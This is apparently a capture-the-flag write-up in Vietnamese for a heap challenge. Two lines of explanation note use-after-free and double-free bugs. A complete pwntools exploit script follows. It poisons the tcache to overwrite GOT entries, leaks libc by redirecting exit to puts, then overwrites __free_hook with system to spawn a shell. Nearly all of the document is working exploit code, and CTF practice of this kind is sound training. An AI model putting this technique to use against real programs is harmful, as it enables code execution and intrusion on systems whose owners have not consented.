- trong chall này có rất nhiều bug như là UAF và DBF, vấn đề là ko có hàm nào in data cho ta leak libc
- lợi dụng các bug trên ta có tấn công GOT exit thành puts và leak libc
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


p = process([exe.path])
gdb.attach(p, gdbscript = '''
b*0x0000000000401846
c
''')

input()

# p = remote("addr", 1337)

def add(idx, size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'>> ', str(size))

def change(idx, size):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'>> ', str(size))

def delete(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'>> ', str(idx))

def edit(idx, data):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'>> ', str(idx))
    p.sendlineafter(b'>> ', data)

add(0, 0x100)
add(1, 0x100)
add(3, 0x100)
add(4, 0x100)
delete(0)
delete(1)
edit(1, p64(0x4035d0))
add(0, 0x100)
add(1, 0x100)
edit(1, p64(exe.got.puts))
add(0, 0x100)
add(1, 0x100)
delete(0)
delete(1)
edit(1, p64(exe.got.exit))
add(0, 0x100)
add(1, 0x100)
edit(1, p64(exe.plt.puts))
p.sendlineafter(b'>> ', b'5')
p.recvuntil(b'Bye\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
print(hex(libc.address))
add(0, 0x50)
add(1, 0x50)
delete(0)
delete(1)
edit(1, p64(libc.sym.__free_hook - 8))
add(0, 0x50)
add(1, 0x50)
edit(1, b'/bin/sh\0' + p64(libc.sym.system))
delete(1)
p.interactive()

```
